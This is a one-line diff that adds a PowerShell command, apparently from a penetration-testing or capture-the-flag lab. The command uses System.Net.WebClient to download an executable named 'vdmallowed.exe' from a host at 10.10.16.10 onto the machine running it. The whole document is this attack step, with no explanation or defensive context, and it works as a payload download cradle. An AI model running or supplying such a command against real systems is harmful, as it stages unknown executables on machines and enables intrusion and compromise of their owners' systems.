@@ -1,0 +1,1 @@
+powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://10.10.16.10:80/vdmallowed.exe', 'vdmallowed.exe')"
